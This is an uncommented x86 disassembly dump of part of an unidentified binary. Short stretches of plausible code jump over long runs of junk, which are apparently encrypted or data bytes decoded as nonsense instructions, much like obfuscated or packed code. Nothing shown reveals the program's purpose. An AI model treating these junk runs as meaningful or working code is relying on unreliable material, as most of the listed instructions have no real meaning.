  414759:	push   eax
  41475a:	mov    eax,DWORD PTR [ebp+0x10]
  41475d:	mov    ecx,DWORD PTR [ebp+0x14]
  414760:	shrd   eax,ecx,0x2
  414764:	shr    ecx,0x2
  414767:	mov    ecx,DWORD PTR [ebp+0x10]
  41476a:	mov    edx,DWORD PTR [ebp+0x14]
  41476d:	xor    eax,esi
  41476f:	xor    edx,edx
  414771:	or     eax,edx
  414773:	push   eax
  414774:	mov    eax,ds:0x422728
  414779:	mov    edi,0x42266e
  41477e:	push   edi
  41477f:	push   DWORD PTR [eax]
  414781:	shl    ecx,0x1e
  414784:	call   0x41b447
  414789:	lea    eax,[ebp-0x80]
  41478c:	push   eax
  41478d:	mov    eax,DWORD PTR [ebp+0x10]
  414790:	jmp    0x414ac9
  414795:	pop    ds
  414796:	cmp    eax,0xaf9fd01d
  41479b:	das    
  41479c:	lods   eax,DWORD PTR ds:[esi]
  41479d:	sbb    DWORD PTR [esi-0x26535b39],edi
  4147a3:	push   esp
  4147a4:	sahf   
  4147a5:	stos   DWORD PTR es:[edi],eax
  4147a6:	sahf   
  4147a7:	mov    esi,0xbec4edbe
  4147ac:	mov    esi,0x890d069f
  4147b1:	cmc    
  4147b2:	xor    eax,0x915bb7c
  4147b7:	out    0x65,al
  4147b9:	or     DWORD PTR ds:[edx+0x1d],0xffffffee
  4147be:	xor    eax,0xada63bfe
  4147c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147c4:	mov    ds:0xc8f14b9d,eax
  4147c9:	rcl    dh,cl
  4147cb:	out    dx,eax
  4147cc:	xor    ah,cl
  4147ce:	mov    bl,0x44
  4147d0:	mov    edi,0x87d118cb
  4147d5:	or     eax,0x866c8dd7
  4147da:	test   cl,dl
  4147dc:	lea    ebx,[esi+edi*8]
  4147df:	mov    eax,0x4031138a
  4147e4:	cld    
  4147e5:	retf   0xd65d
  4147e8:	test   edx,0x9a7eab7b
  4147ee:	mov    ah,0x95
  4147f0:	inc    ebx
  4147f1:	mov    ebp,0x1afd54f6
  4147f6:	imul   eax,DWORD PTR [ebp-0x2e308acc],0x3344534a
  414800:	dec    eax
  414801:	lahf   
  414802:	test   DWORD PTR [eax+edi*8-0x7e],esi
  414806:	out    dx,eax
  414807:	lods   al,BYTE PTR ds:[esi]
  414808:	mov    eax,esp
  41480a:	ret    0x597c
  41480d:	add    ah,BYTE PTR [eax]
  41480f:	pop    es
  414810:	call   0x898e:0x9129249a
  414817:	cdq    
  414818:	int3   
  414819:	iret   
  41481a:	cmc    
  41481b:	jg     0x41483a
  41481d:	fs int3 
  41481f:	pop    esi
  414820:	in     eax,0xcf
  414822:	add    eax,0xf8ba437c
  414827:	inc    ebp
  414828:	test   BYTE PTR [ecx-0x39c78f48],al
  41482e:	icebp  
  41482f:	inc    esp
  414830:	repz xor dl,al
  414833:	stos   BYTE PTR es:[edi],al
  414834:	jp     0x414882
  414836:	rol    dh,1
  414838:	clc    
  414839:	push   0x5bf3c9c2
  41483e:	xchg   ecx,eax
  41483f:	shr    dh,1
  414841:	mov    ch,0x86
  414843:	xchg   ah,bh
  414845:	adc    DWORD PTR [eax-0x44],esi
  414848:	fwait
  414849:	add    bh,bh
  41484b:	pop    ecx
  41484c:	and    dh,BYTE PTR ds:0x7237020c
  414852:	jp     0x4147dd
  414854:	inc    ecx
  414855:	repz ss sub al,0x91
  414859:	pop    ss
  41485a:	mov    esi,0xa2595edc
  41485f:	xchg   ecx,eax
  414860:	ins    BYTE PTR es:[edi],dx
  414861:	or     BYTE PTR [edi-0x27633d59],cl
  414867:	push   ss
  414868:	xchg   esi,esi
  41486a:	(bad)  
  41486c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41486d:	popa   
  41486e:	mov    al,0x11
  414870:	jb     0x4147fe
  414872:	dec    ecx
  414873:	loope  0x4148d2
  414875:	daa    
  414876:	retf   0xb7b3
  414879:	out    dx,eax
  41487a:	jecxz  0x4148bc
  41487c:	repnz mov eax,0xe30dc6a8
  414882:	mov    esi,0x9aa5a03f
  414887:	mov    ah,0xa8
  414889:	retf   
  41488a:	mov    al,ds:0x13fff4
  41488f:	jecxz  0x414861
  414891:	jb     0x4148ae
  414893:	cs inc ebp
  414895:	mov    ch,0x40
  414897:	mov    cl,0xe3
  414899:	xchg   esp,eax
  41489a:	outs   dx,DWORD PTR ds:[esi]
  41489b:	jge    0x4148b5
  41489d:	shl    BYTE PTR [ecx+0x67],0x7d
  4148a1:	jmp    0x8b30c9ab
  4148a6:	and    esp,DWORD PTR [edi+0x8]
  4148a9:	xchg   edx,eax
  4148aa:	leave  
  4148ab:	sub    ebx,DWORD PTR fs:[ebx+edi*1]
  4148af:	and    ebx,DWORD PTR [edx+0x64]
  4148b2:	push   ebx
  4148b3:	xor    edi,DWORD PTR [ecx-0x7e7a6260]
  4148b9:	call   0x7a87:0xd45344ba
  4148c0:	ds repz and al,0x68
  4148c4:	in     eax,dx
  4148c5:	mov    ebp,0x8aed132b
  4148ca:	(bad)  
  4148cb:	loope  0x41487e
  4148cd:	cmp    al,0x5e
  4148d0:	mov    ecx,0x8e8a57d7
  4148d5:	dec    ebp
  4148d6:	ret    0xd9b4
  4148d9:	dec    ebx
  4148da:	lahf   
  4148db:	clc    
  4148dc:	popf   
  4148dd:	dec    edi
  4148de:	clc    
  4148df:	mov    esp,0xd76ca763
  4148e4:	jmp    0x5c352fd3
  4148e9:	or     DWORD PTR [edi],esi
  4148eb:	inc    ebx
  4148ec:	inc    edi
  4148ed:	sbb    BYTE PTR [esi],al
  4148ef:	jmp    0x4148fe
  4148f1:	jl     0x4148c0
  4148f3:	cmp    eax,0x636fe22c
  4148f8:	adc    al,0x2a
  4148fa:	call   0x5df2:0x2968db30
  414901:	aaa    
  414902:	push   0xffffffb1
  414904:	fistp  DWORD PTR [edx+ebp*1+0x4cb65a40]
  41490b:	inc    esi
  41490c:	pop    es
  41490d:	jae    0x41497f
  41490f:	dec    ebx
  414910:	pop    es
  414911:	stc    
  414912:	pop    ds
  414913:	lods   al,BYTE PTR ds:[esi]
  414914:	enter  0xba1c,0x52
  414918:	xor    ecx,esi
  41491a:	xchg   DWORD PTR ds:0x6dbfb2a4,edi
  414920:	add    al,0xbb
  414922:	or     bh,BYTE PTR [esi-0x60ceaf3f]
  414928:	or     al,0x7c
  41492a:	shl    DWORD PTR [eax-0x6bd99e1e],1
  414930:	xor    DWORD PTR [ebp-0x16fff680],ebp
  414936:	sub    BYTE PTR [ebx],0xc3
  414939:	je     0x4149b6
  41493b:	push   cs
  41493c:	jmp    0x4148ef
  41493e:	jmp    0x1e4:0xd45776af
  414945:	jl     0x414945
  414947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414948:	push   eax
  414949:	repnz dec ecx
  41494b:	mov    dh,0xa0
  41494d:	inc    esp
  41494e:	dec    edx
  41494f:	jnp    0x414929
  414951:	lods   al,BYTE PTR ds:[esi]
  414952:	rcl    BYTE PTR [edx],1
  414954:	test   BYTE PTR [esi-0x4e],bl
  414957:	icebp  
  414958:	mov    ecx,0xce1dde94
  41495d:	ja     0x414992
  41495f:	ds in  eax,dx
  414961:	ins    DWORD PTR es:[edi],dx
  414962:	jne    0x4149a9
  414964:	cmp    BYTE PTR [edx+0x51],dh
  414967:	or     edi,DWORD PTR [ebx]
  414969:	inc    ebp
  41496a:	pop    ds
  41496b:	aas    
  41496c:	mov    al,ds:0x12d639d0
  414971:	gs sub al,0x2
  414974:	dec    eax
  414975:	outs   dx,DWORD PTR ds:[esi]
  414976:	in     eax,0xd8
  414978:	loop   0x41497a
  41497a:	mov    ecx,0x31e04156
  41497f:	fstp   DWORD PTR [ebx-0x29722bda]
  414985:	or     al,BYTE PTR [ebx-0x71]
  414988:	aas    
  414989:	aam    0x1b
  41498b:	mov    ds:0x1fc9c213,al
  414990:	jmp    0x720b:0xcad1bd2f
  414997:	jno    0x4149df
  414999:	je     0x414a1a
  41499b:	scas   eax,DWORD PTR es:[edi]
  41499c:	jbe    0x41492f
  41499e:	xchg   BYTE PTR [ecx-0x76156fe8],bl
  4149a4:	cdq    
  4149a5:	xchg   esp,eax
  4149a6:	outs   dx,BYTE PTR ds:[esi]
  4149a7:	arpl   WORD PTR [ebp+0x6f933974],si
  4149ad:	mov    ecx,0x80c842aa
  4149b2:	aad    0x3d
  4149b4:	adc    DWORD PTR [ebp+0x5d],edi
  4149b7:	fisub  DWORD PTR [ecx+0x46]
  4149ba:	in     eax,0x74
  4149bc:	iret   
  4149bd:	or     eax,0xb9e0f375
  4149c2:	push   ebp
  4149c3:	test   DWORD PTR [ebx+edi*8],ecx
  4149c6:	lock test DWORD PTR [edi],ebx
  4149c9:	rcr    BYTE PTR [ecx],1
  4149cb:	push   ebp
  4149cc:	aam    0x71
  4149ce:	sar    BYTE PTR [edx+0x300f115c],cl
  4149d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149d5:	inc    ebx
  4149d6:	mov    eax,ds:0x68c8931e
  4149db:	(bad)  
  4149dc:	fild   QWORD PTR [ebx-0x41]
  4149df:	(bad)  
  4149e0:	cmp    al,0xcd
  4149e2:	cmp    BYTE PTR [edx+0x7e],ch
  4149e5:	fadd   QWORD PTR [edx+0xc]
  4149e8:	sub    al,0x5e
  4149ea:	inc    ecx
  4149eb:	pushf  
  4149ec:	mov    esp,0x938bf9c9
  4149f1:	sbb    esi,edi
  4149f3:	inc    ecx
  4149f4:	sbb    cl,0xb3
  4149f7:	dec    edx
  4149f8:	dec    ebp
  4149f9:	pop    esp
  4149fa:	js     0x414a1b
  4149fc:	das    
  4149fd:	xor    eax,0x47ec8425
  414a02:	jbe    0x4149d8
  414a04:	repnz and eax,DWORD PTR [edi+edx*8-0x22d8d9d9]
  414a0c:	scas   al,BYTE PTR es:[edi]
  414a0d:	dec    esi
  414a0e:	pusha  
  414a0f:	and    cl,BYTE PTR [edi+0x3e]
  414a12:	pop    esi
  414a13:	(bad)
  414a17:	jnp    0x414a26
  414a19:	jl     0x414a5f
  414a1b:	xchg   esi,eax
  414a1c:	pop    ebp
  414a1d:	iret   
  414a1e:	imul   eax,edi,0xfffffff1
  414a21:	outs   dx,DWORD PTR ds:[esi]
  414a22:	ins    BYTE PTR es:[edi],dx
  414a23:	adc    DWORD PTR [eax-0x5daf3ae4],ebp
  414a29:	xchg   esi,eax
  414a2a:	adc    DWORD PTR [edi+0x1718071f],0x76
  414a31:	in     eax,dx
  414a32:	mov    dh,0x19
  414a34:	aaa    
  414a35:	inc    edi
  414a36:	mov    al,0x42
  414a38:	(bad)  
  414a39:	leave  
  414a3a:	xor    ecx,DWORD PTR [edi-0x89dcb96]
  414a40:	mov    ebp,0x2c059886
  414a45:	stos   DWORD PTR es:[edi],eax
  414a46:	in     eax,0x1a
  414a48:	inc    edi
  414a49:	adc    BYTE PTR [eax+0x59],bl
  414a4c:	ins    BYTE PTR es:[edi],dx
  414a4d:	mov    esp,0x9b70e58e
  414a52:	jl     0x4149fe
  414a54:	add    eax,0x6d9d8c94
  414a59:	je     0x414a37
  414a5b:	scas   eax,DWORD PTR es:[edi]
  414a5c:	pop    esp
  414a5d:	repz push ebp
  414a5f:	popa   
  414a60:	cmp    cl,0x0
  414a63:	mov    esp,0xb93b291a
  414a68:	fsub   DWORD PTR [ebx]
  414a6a:	push   edx
  414a6b:	sub    edi,DWORD PTR [edi-0x2]
  414a6e:	fisub  DWORD PTR [edi]
  414a70:	mov    ds:0x4156eea4,al
  414a75:	jno    0x414a27
  414a77:	sub    eax,DWORD PTR [ebp+0x22]
  414a7a:	in     al,0x31
  414a7c:	ja     0x414a7c
  414a7e:	(bad)  [ebp-0x5bb9b5e3]
  414a84:	sbb    al,0xba
  414a86:	fisttp WORD PTR [esi+0x3227112b]
  414a8c:	xor    dh,dh
  414a8e:	or     BYTE PTR [eax+0x49c65274],bh
  414a94:	iret   
  414a95:	call   0xdd9bcd9f
  414a9a:	in     eax,dx
  414a9b:	mov    ebp,ebp
  414a9d:	cs mov al,0x3d
  414aa0:	nop
  414aa1:	shr    al,cl
  414aa3:	ins    BYTE PTR es:[edi],dx
  414aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aa5:	push   0x30ef5d84
  414aaa:	push   edx
  414aab:	in     al,dx
  414aac:	jbe    0x414a4a
  414aae:	mul    bl
  414ab0:	inc    ebp
  414ab1:	pop    edx
  414ab2:	mov    ebx,0xd2b9c8bf
  414ab7:	sub    al,dh
  414ab9:	mov    BYTE PTR [ecx-0x65],bl
  414abc:	inc    ecx
  414abd:	inc    ecx
  414abe:	or     DWORD PTR [edx],eax
  414ac0:	dec    esi
  414ac1:	xchg   ah,dl
  414ac3:	or     esp,edi
  414ac5:	jbe    0x414aef
  414ac7:	mov    dh,0x8b
  414aca:	dec    ebp
  414acb:	adc    al,0xf
  414acd:	lods   al,BYTE PTR ds:[esi]
  414ace:	enter  0xc102,0xe9
  414ad2:	add    cl,BYTE PTR [ebx+0x558b104d]
  414ad8:	adc    al,0x33
  414ada:	(bad)  
  414adb:	xor    edx,edx
  414add:	or     eax,edx
  414adf:	push   eax
  414ae0:	mov    eax,ds:0x422728
  414ae5:	push   edi
  414ae6:	push   DWORD PTR [eax]
  414ae8:	shl    ecx,0x1e
  414aeb:	call   0x41b447
  414af0:	mov    eax,DWORD PTR [ebp-0x3c]
  414af3:	mov    eax,DWORD PTR [ebp-0x2c]
  414af6:	mov    edi,DWORD PTR [ebp-0x24]
  414af9:	mov    eax,DWORD PTR [ebp-0x30]
  414afc:	mov    ecx,edi
  414afe:	mov    DWORD PTR [ebp-0x1c],eax
  414b01:	rol    ecx,0x2
  414b04:	mov    eax,0xa5069bae
  414b09:	xor    ecx,eax
  414b0b:	jmp    0x414e44
  414b10:	fisttp WORD PTR [eax+0x5aac5a8c]
  414b16:	xor    BYTE PTR [esp+edx*1+0x7a9e14bc],bh
  414b1d:	cli    
  414b1e:	mov    ss,WORD PTR [eax-0x41415b25]
  414b24:	in     eax,dx
  414b25:	les    edi,FWORD PTR [esi+0x68668be]
  414b2b:	ret    0x55a
  414b2e:	fs aam 0x19
  414b31:	stos   DWORD PTR es:[edi],eax
  414b32:	dec    esi
  414b33:	mov    edi,0x3499dcd3
  414b38:	mov    bl,0x95
  414b3a:	ror    DWORD PTR [esi],0x5a
  414b3d:	push   0xca94ca52
  414b42:	inc    ecx
  414b43:	pop    eax
  414b44:	add    BYTE PTR ds:0x7dc1ce62,dh
  414b4a:	mov    WORD PTR [edi-0x72485b84],cs
  414b50:	imul   edx,ecx,0x4
  414b53:	fstp   TBYTE PTR [ecx+0x3124e593]
  414b59:	and    DWORD PTR [ebx-0x47],ecx
  414b5c:	mov    eax,ds:0x4697840d
  414b61:	ss in  al,dx
  414b63:	adc    al,0xfd
  414b65:	sar    edx,0x4
  414b68:	loop   0x414b36
  414b6a:	mov    ch,0x83
  414b6c:	cdq    
  414b6d:	adc    al,0x67
  414b6f:	dec    ebx
  414b70:	pop    esp
  414b71:	neg    DWORD PTR [ebx-0x7b35fb4f]
  414b77:	ret    
  414b78:	int    0x7e
  414b7a:	inc    ebp
  414b7b:	and    eax,0x219f939d
  414b80:	dec    edi
  414b81:	mov    WORD PTR [ecx+0x5c],es
  414b84:	xchg   edx,eax
  414b85:	mov    ecx,0xb147d693
  414b8a:	sbb    eax,0xa606f72
  414b8f:	jmp    0xabb72cc9
  414b94:	xor    ebx,0xffffff85
  414b97:	jb     0x414b89
  414b99:	out    dx,al
  414b9a:	imul   DWORD PTR [ebp+0x1c]
  414b9d:	add    dh,dl
  414b9f:	inc    ebx
  414ba0:	aas    
  414ba1:	cwde   
  414ba2:	pop    ebp
  414ba3:	call   FWORD PTR [esi+0x2c]
  414ba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ba7:	jp     0x414b7c
  414ba9:	aaa    
  414baa:	das    
  414bab:	out    dx,eax
  414bac:	add    esp,DWORD PTR [esi]
  414bae:	fstp   QWORD PTR [edi-0x73]
  414bb1:	div    DWORD PTR [ebp+ecx*2+0x55]
  414bb5:	aaa    
  414bb6:	jo     0x414bc3
  414bb8:	inc    edi
  414bb9:	mov    ds:0x17421290,al
  414bbe:	popa   
  414bbf:	xchg   esp,eax
  414bc0:	ret    0xc4fa
  414bc3:	pop    edi
  414bc4:	retf   
  414bc5:	pop    DWORD PTR [edi-0x359fa584]
  414bcb:	mov    dl,0xa
  414bcd:	fild   QWORD PTR [ebx+0x4]
  414bd0:	mov    eax,0xce774439
  414bd5:	int    0x6f
  414bd7:	cs ins BYTE PTR es:[edi],dx
  414bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bda:	jb     0x414be9
  414bdc:	mov    ebp,0xaff0d8d9
  414be1:	ror    BYTE PTR [eax],0xd
  414be4:	add    bh,0x8f
  414be7:	xlat   BYTE PTR ds:[ebx]
  414be8:	xor    al,ch
  414bea:	imul   edi,esp,0xe
  414bed:	dec    eax
  414bee:	lds    ecx,FWORD PTR [edx+0x2ce1a941]
  414bf4:	sbb    bl,BYTE PTR [edi-0x56]
  414bf7:	int    0x3e
  414bf9:	push   0x2a34cd98
  414bfe:	adc    bh,BYTE PTR [ebp-0x1506ed6]
  414c04:	and    ebp,ebp
  414c06:	mov    cl,0xca
  414c08:	sub    DWORD PTR [edi+edi*4],ebx
  414c0b:	mov    DWORD PTR [edi-0x462526c5],0x89fc7aa7
  414c15:	jae    0x414bde
  414c17:	imul   eax,edi,0xc0058a97
  414c1d:	pop    eax
  414c1e:	mov    ah,0xcf
  414c20:	jmp    0x2d98:0x825bdcf0
  414c27:	(bad)  
  414c29:	dec    esi
  414c2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c2b:	mov    ecx,DWORD PTR [esi]
  414c2d:	jns    0x414bfc
  414c2f:	sbb    BYTE PTR [edi+edx*1+0x6c525e09],cl
  414c36:	xchg   esi,eax
  414c37:	push   es
  414c38:	sub    eax,0xb5bd7f31
  414c3d:	inc    esi
  414c3e:	nop
  414c3f:	jmp    0x88643e53
  414c44:	sub    dl,BYTE PTR [ebx+0x2e]
  414c47:	push   0x8350467a
  414c4c:	mov    eax,ds:0xbab20d77
  414c51:	mov    esp,edi
  414c53:	or     esp,DWORD PTR [edx-0x3fcc72f1]
  414c59:	mov    ds:0x3ecee1c7,eax
  414c5e:	xchg   ecx,eax
  414c5f:	fndisi(8087 only) 
  414c61:	add    eax,0xe867ac46
  414c66:	xchg   ebp,eax
  414c67:	pop    ebx
  414c68:	mov    ecx,0x4cb07603
  414c6d:	adc    eax,0x1422993b
  414c72:	and    ebp,DWORD PTR [edi+0x164255b5]
  414c78:	loope  0x414cf2
  414c7a:	daa    
  414c7b:	daa    
  414c7c:	xchg   DWORD PTR [ebx+ecx*2-0x25],ecx
  414c80:	fcmovu st,st(1)
  414c82:	aas    
  414c83:	pop    esp
  414c84:	pop    edi
  414c85:	shr    ch,1
  414c87:	push   cs
  414c88:	adc    al,0xb8
  414c8a:	mov    bl,0xaa
  414c8c:	inc    edx
  414c8d:	cmp    al,0x51
  414c8f:	pop    es
  414c90:	lods   al,BYTE PTR ds:[esi]
  414c91:	jmp    0x3806:0x73ecf675
  414c98:	inc    ebx
  414c99:	add    al,0x7e
  414c9b:	xchg   ebp,eax
  414c9c:	outs   dx,DWORD PTR ds:[esi]
  414c9d:	loop   0x414d0d
  414c9f:	sbb    DWORD PTR [eax+0x21ce8147],edi
  414ca5:	sbb    eax,0xc8757115
  414caa:	push   0x73
  414cac:	mov    ecx,0xc2cab3bb
  414cb1:	mov    bl,0x5
  414cb3:	jecxz  0x414ca3
  414cb5:	imul   ebx,DWORD PTR [eax],0xdab3072f
  414cbb:	sub    esi,DWORD PTR [esi+0x5d]
  414cbe:	sub    BYTE PTR [ebx-0x7],ch
  414cc1:	pop    ecx
  414cc2:	dec    ebx
  414cc3:	and    al,0x1
  414cc5:	or     al,0x20
  414cc7:	call   0x2d9503f4
  414ccc:	lods   al,BYTE PTR ds:[esi]
  414ccd:	outs   dx,BYTE PTR ds:[esi]
  414cce:	aam    0x53
  414cd0:	fwait
  414cd1:	mov    edi,0x18cdde7e
  414cd6:	mov    WORD PTR [eax+0x6c],?
  414cd9:	cmp    eax,0xf45a31af
  414cde:	inc    ebx
  414cdf:	inc    edx
  414ce0:	push   edx
  414ce1:	in     eax,0xcc
  414ce3:	push   ebx
  414ce4:	mov    ebp,cs
  414ce6:	mov    edx,DWORD PTR [esi]
  414ce8:	inc    ebx
  414ce9:	push   DWORD PTR [eax]
  414ceb:	das    
  414cec:	xchg   ecx,eax
  414ced:	pop    esi
  414cee:	cmp    edx,edx
  414cf0:	sub    DWORD PTR ds:0x26ff49b1,ebx
  414cf6:	xor    cl,dh
  414cf8:	jne    0x414d21
  414cfa:	sti    
  414cfb:	add    BYTE PTR [edi],dl
  414cfd:	fdiv   st,st(4)
  414cff:	mov    esp,0x823533e2
  414d04:	add    BYTE PTR [esi],ch
  414d06:	jo     0x414d36
  414d08:	push   ecx
  414d09:	in     al,0x14
  414d0b:	mov    dl,0xfc
  414d0d:	shr    ch,1
  414d0f:	out    dx,al
  414d10:	xor    al,0x86
  414d12:	mov    eax,0xd13e0993
  414d17:	test   al,0x2d
  414d19:	inc    edi
  414d1a:	mov    edi,0x33444100
  414d1f:	in     al,dx
  414d20:	jmp    esp
  414d22:	dec    ecx
  414d23:	dec    ecx
  414d24:	mov    eax,ds:0x70b8bf73
  414d29:	sbb    DWORD PTR [edi-0x53],0x7ef342ee
  414d30:	sahf   
  414d31:	aad    0x79
  414d33:	in     al,dx
  414d34:	aas    
  414d35:	xor    dh,dl
  414d37:	in     al,0xc0
  414d39:	loope  0x414ce8
  414d3b:	js     0x414cee
  414d3d:	adc    al,0x47
  414d3f:	adc    ebp,DWORD PTR [eax-0x4e226a2e]
  414d45:	lds    esi,FWORD PTR [esi]
  414d47:	cmp    esi,ebx
  414d49:	out    0xe9,al
  414d4b:	cld    
  414d4c:	sbb    ah,BYTE PTR [edi-0x47d667e4]
  414d52:	icebp  
  414d53:	fcomp  DWORD PTR fs:0x3bf02d40
  414d5a:	outs   dx,BYTE PTR ds:[esi]
  414d5b:	add    BYTE PTR [eax],bl
  414d5d:	out    0x19,al
  414d5f:	xchg   edi,eax
  414d60:	fsubr  st,st(7)
  414d62:	(bad)  
  414d63:	repnz int 0xc4
  414d66:	gs ds push eax
  414d69:	call   0xf10a2e3f
  414d6e:	and    dh,BYTE PTR [edx+0x10c97467]
  414d74:	dec    eax
  414d75:	sub    esi,DWORD PTR [edi]
  414d77:	sub    DWORD PTR [edi],ecx
  414d79:	pop    esp
  414d7a:	ret    0x6d30
  414d7d:	outs   dx,DWORD PTR ds:[esi]
  414d7e:	in     al,0x85
  414d80:	dec    ecx
  414d81:	pop    ebx
  414d82:	add    BYTE PTR [ebp+ecx*8+0x3ba0d4cf],bh
  414d89:	xlat   BYTE PTR ds:[ebx]
  414d8a:	jb     0x414dfa
  414d8c:	jge    0x414ddd
  414d8e:	add    DWORD PTR [edi+0x70],edx
  414d91:	cs pop edi
  414d93:	sbb    al,ch
  414d95:	xchg   edi,eax
  414d96:	pop    esi
  414d97:	aaa    
  414d98:	int3   
  414d99:	call   0xa241:0x508167e6
  414da0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414da1:	(bad)  
  414da3:	push   ebp
  414da4:	pop    ecx
  414da5:	scas   al,BYTE PTR es:[edi]
  414da6:	mov    eax,0x12c76f3a
  414dab:	shl    DWORD PTR [edi+0x5],1
  414dae:	and    bh,ch
  414db0:	ds dec ebx
  414db2:	clc    
  414db3:	scas   eax,DWORD PTR es:[edi]
  414db4:	push   cs
  414db5:	loopne 0x414e14
  414db7:	ins    DWORD PTR es:[edi],dx
  414db8:	ret    0x1c6e
  414dbb:	add    DWORD PTR [edx+0x2c],eax
  414dbe:	addr16 fwait
  414dc0:	and    dl,BYTE PTR [esp+eax*1-0xd3bb3df]
  414dc7:	dec    edx
  414dc8:	add    ch,BYTE PTR [ecx]
  414dca:	shr    ebp,0x1c
  414dcd:	js     0x414e01
  414dcf:	and    BYTE PTR [eax],ch
  414dd1:	test   eax,0xa0548702
  414dd6:	or     DWORD PTR [eax],0xffffffba
  414dd9:	ja     0x414d7e
  414ddb:	icebp  
  414ddc:	jb     0x414e1e
  414dde:	dec    ebx
  414ddf:	loop   0x414de8
  414de1:	aas    
  414de2:	retf   
  414de3:	fild   DWORD PTR [edi+0x6a0526f3]
  414de9:	and    edi,edx
  414deb:	push   0x9bb674f8
  414df0:	xchg   DWORD PTR [edx-0x5a],edx
  414df3:	jmp    DWORD PTR [esi+eax*2-0x11ed27b1]
  414dfa:	cmp    ebp,DWORD PTR [edi+ebp*2-0x54]
  414dfe:	scas   al,BYTE PTR es:[edi]
  414dff:	jmp    0x414de3
  414e01:	in     eax,dx
  414e02:	not    DWORD PTR [edi-0x41]
  414e05:	pushf  
  414e06:	enter  0xbff6,0x3a
  414e0a:	dec    ebx
  414e0b:	int    0xb9
  414e0d:	or     esp,edx
  414e0f:	enter  0xbd81,0xa1
  414e13:	jmp    0x966b:0xc50e1425
  414e1a:	pusha  
  414e1b:	rcl    DWORD PTR [edi-0x50],1
  414e1e:	mov    eax,0xf5512a10
  414e23:	mov    esp,0xc6d2d4c6
  414e28:	sbb    ebx,esp
  414e2a:	push   0xffffffe7
  414e2c:	sahf   
  414e2d:	and    ebp,ecx
  414e2f:	xchg   esi,eax
  414e30:	(bad)  
  414e31:	fmul   DWORD PTR [ebx]
  414e33:	cld    
  414e34:	test   eax,0x90b5660a
  414e39:	es nop
  414e3b:	push   edx
  414e3c:	sbb    eax,0x9a659ac7
  414e41:	or     al,0xdd
  414e43:	jecxz  0x414e80
  414e45:	enter  0x34e9,0x3
  414e49:	add    BYTE PTR [eax],al
  414e4b:	call   0xa44dd255
  414e50:	mov    WORD PTR [edi+0x2a],fs
  414e53:	mov    eax,0x989e22a6
  414e58:	iret   
  414e59:	mov    edx,0xbeaa0ca4
  414e5e:	mov    esi,0xbebec4ed
  414e63:	out    dx,eax
  414e64:	cs mov dh,0x91
  414e67:	(bad)  
  414e68:	lock (bad) 
  414e6a:	out    dx,eax
  414e6b:	fs xchg edi,eax
  414e6d:	dec    esi
  414e6e:	jae    0x414dff
  414e70:	mov    cl,0x85
  414e72:	outs   dx,BYTE PTR cs:[esi]
  414e74:	cld    
  414e75:	adc    eax,0x1fb10c3b
  414e7a:	sahf   
  414e7b:	jno    0x414e24
  414e7d:	add    al,BYTE PTR [edx-0x22a0e9f4]
  414e83:	inc    ebp
  414e84:	ret    0xef49
  414e87:	addr16 icebp 
  414e89:	mov    DWORD PTR [esi+0x7022e069],edx
  414e8f:	retf   
  414e90:	dec    ecx
  414e91:	cmp    edx,DWORD PTR [ebx+edx*1+0x272482a2]
  414e98:	into   
  414e99:	and    edi,esi
  414e9b:	(bad)  
  414e9c:	(bad)  
  414e9d:	fcom   QWORD PTR [ebp-0x51]
  414ea0:	arpl   bp,cx
  414ea2:	repnz out dx,al
  414ea4:	push   ecx
  414ea5:	jp     0x414e97
  414ea7:	xchg   edx,ebx
  414ea9:	adc    eax,ecx
  414eab:	mov    ebx,0x1a898b9e
  414eb0:	jg     0x414ea0
  414eb2:	push   cs
  414eb3:	ret    0xebf7
  414eb6:	sbb    dl,BYTE PTR [ecx]
  414eb8:	bound  esi,QWORD PTR [esi-0x7]
  414ebb:	adc    BYTE PTR [eax+0x53fc69a8],0x83
  414ec2:	inc    esi
  414ec3:	jge    0x414f2e
  414ec5:	sub    BYTE PTR [edi-0x4e],bh
  414ec8:	push   eax
  414ec9:	dec    esi
  414eca:	out    0x54,al
  414ecc:	ret    0xa97e
  414ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ed0:	sbb    eax,0xfc1ab383
  414ed5:	push   0xffffffba
  414ed7:	repnz dec esi
  414ed9:	loope  0x414f3c
  414edb:	or     DWORD PTR [ecx-0x54],esi
  414ede:	pop    ebp
  414edf:	sahf   
  414ee0:	jl     0x414ecc
  414ee2:	adc    edx,edi
  414ee4:	popf   
  414ee5:	loope  0x414f66
  414ee7:	xchg   BYTE PTR [edi],bl
  414ee9:	mov    ch,0x3c
  414eeb:	jo     0x414f2c
  414eed:	stos   DWORD PTR es:[edi],eax
  414eee:	fdiv   DWORD PTR [ecx]
  414ef0:	out    0x5e,eax
  414ef2:	xor    BYTE PTR [ebp+ebx*8+0x1],cl
  414ef6:	xlat   BYTE PTR ds:[ebx]
  414ef7:	mov    edx,0x234b2a70
  414efc:	xchg   esi,eax
  414efd:	lods   al,BYTE PTR ds:[esi]
  414efe:	xchg   ebp,eax
  414eff:	outs   dx,BYTE PTR ds:[esi]
  414f00:	sub    esp,eax
  414f02:	pop    edx
  414f03:	int    0x93
  414f05:	jb     0x414ef0
  414f07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f09:	fwait
  414f0a:	aad    0xf2
  414f0c:	addr16 push ds
  414f0e:	imul   ebx,DWORD PTR [esi+esi*4-0x70],0xffffffe9
  414f13:	mov    eax,0xc15c000e
  414f18:	es hlt 
  414f1a:	jmp    0xe713:0xcbd3b177
  414f21:	dec    esi
  414f22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f23:	cmp    eax,0xcc72bb70
  414f28:	ret    0x953a
  414f2b:	push   ebp
  414f2c:	imul   eax,DWORD PTR [ebx+eax*4+0x19],0xa604b4f3
  414f34:	into   
  414f35:	pop    ss
  414f36:	jmp    0xa0d2b9de
  414f3b:	push   ebp
